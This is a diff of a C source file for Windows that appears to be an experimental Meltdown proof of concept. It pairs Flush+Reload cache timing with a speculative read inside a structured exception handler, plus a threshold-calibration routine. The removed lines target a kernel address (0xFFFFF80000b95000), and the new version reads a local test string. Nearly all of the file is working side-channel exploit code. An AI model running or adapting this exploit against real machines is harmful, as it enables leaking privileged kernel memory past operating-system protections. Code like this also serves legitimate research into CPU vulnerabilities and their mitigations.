@@ -7,7 +7,7 @@
 #include <windows.h>
 #include <stdint.h>
 
-const char strings[] = {"Michal bialek konczyl nocna zmiane w serwerowni wykopu..."};
+const char strings[] = {"Michal bialek konczyl nocna zmiane w serwerowni wykopu."};
 char disp[] = "................";
 jmp_buf array_access_exception;
 jmp_buf buf;
@@ -15,26 +15,18 @@ static char* _mem = NULL, * mem = NULL;
 
 static size_t phys = 0;
 size_t cache_miss_threshold;
+
+char dupa = ' ';
 static inline void flush(void* p) {
 	_mm_clflush(p);
 }
 static inline void maccess(void* p) {
 	*(volatile size_t*)p;
 }
-//static uint64_t rdtsc() {
-//	uint64_t volatile a = 0, d = 0;
-//	__asm {
-//
-//		RDTSCP
-//		MOV DWORD PTR[d], EDX
-//		MOV DWORD PTR[a], EAX
-//
-//	}
-//	a = (d << 32) | a;
-//	return a;
-//}
+
 static inline uint64_t rdtsc() {
 	uint64_t a;
+	uint32_t c;
 
 	_mm_mfence();
 	a = __rdtsc();
@@ -49,8 +41,8 @@ static inline uint64_t rdtsc() {
 //		add eax, dword ptr b
 //	}
 //}
-static int flush_reload(void* ptr) {
-	uint64_t volatile start = 0, end = 0;
+static int inline flush_reload(void* ptr) {
+	uint64_t  start = 0, end = 0;
 
 	start = rdtsc();
 	maccess(ptr);
@@ -63,7 +55,7 @@ static int flush_reload(void* ptr) {
 	}
 	return 0;
 }
-int packed_read(size_t addr) {
+static int inline packed_read(size_t addr) {
 	phys = addr;
 
 	char res_stat[256];
@@ -86,10 +78,20 @@ int packed_read(size_t addr) {
 	}
 	return max_i;
 }
+void raise_exp()
+{
+	for (volatile int i = 0; i < 100000; i++)
+		;
+
+	longjmp(buf, 1);
+
+	return;
+}
+
 int read_buf() {
 	//phys = addr;
 
-	size_t retries = 100 + 1;
+	size_t retries = 10000;
 	uint64_t start = 0, end = 0;
 
 
@@ -97,20 +99,27 @@ int read_buf() {
 	while (retries--) {
 
 	
-		__try {
+		
 			//MELTDOWN
 			uint64_t volatile  byte;
-		retry:
-			byte = *(volatile uint8_t*)phys;
-			byte <<= 12;
-			//if (byte == 0) goto retry;
+		
+				__try {
+					byte = 0;
+					RaiseException(0, 0, 0, 0);
+					byte = *(volatile uint8_t*)phys;
+					byte <<= 12;
+					//if (byte == 0) goto retry;
 
-			*(volatile uint64_t*)(mem + byte);
-			//END MELTDOWN;
-		}
-		__except (1) {
-	
-		}
+					*(volatile uint64_t*)(mem + byte);
+					//END MELTDOWN;
+				}
+				__except(1){
+					
+				}
+			
+			
+			
+		
 		int volatile i;
 		for (i = 0; i < 256; i++) {
 			if (flush_reload(mem + i * 4096)) {
@@ -128,8 +137,8 @@ int read_buf() {
 
 static void detect_flush_reload_threshold() {
 	size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
-	char dummy[4];
-	size_t* ptr=dummy;
+	char dummy[16];
+	size_t* ptr=dummy+8;
 	uint64_t start = 0, end = 0;
 
 	maccess(ptr);
@@ -151,7 +160,7 @@ static void detect_flush_reload_threshold() {
 
 	printf("Flush+Reload: %zd cycles, Reload only: %zd cycles\n",
 		flush_reload_time, reload_time);
-	cache_miss_threshold = (flush_reload_time + reload_time * 2) / 3;
+	cache_miss_threshold = (flush_reload_time + reload_time ) / 2;
 	printf("Flush+Reload threshold: %zd cycles\n",
 		cache_miss_threshold);
 }
@@ -170,10 +179,10 @@ int main() {
 
 	int aX = 2;
 
-	_mem = malloc(4096 * 256);
+	_mem = malloc(4096 * 300);
 
-	mem = (char*)(((size_t)_mem  ) );
-	memset(mem, 0xFF, 4096 * 256);
+	mem = (char*)(((size_t)_mem & ~0xfff) + 0x1000 * 2);
+	memset(mem, 0xab, 4096 * 290);
 
 
 	for (int j = 0; j < 256; j++) {
@@ -202,9 +211,10 @@ int main() {
 	unsigned char value='X';
 	
 	int indexer = 0;
+	int xD = 0;
 	while (1) {
 
-		value = packed_read((0xFFFFF80000b95000 + index));
+		value = packed_read((strings + index));
 		printf("%.2X ", value);
 		fflush(stdout);
 		addchar(value, indexer);
@@ -212,9 +222,15 @@ int main() {
 		indexer++;
 
 		if (indexer == 16) {
-			printf(" | %s \n [%d]", disp, (0xFFFFF80000b95000 + index));
+			printf(" | %s %c\n[%I64X] ", disp, dupa, (strings + index));
 			indexer = 0;
-			//__debugbreak();
+			dupa = ' ';
+			xD++;
+			
+			if (xD == 8) {
+				xD = 0;
+				//__debugbreak();
+			}
 		}
 	}
 	system("pause");
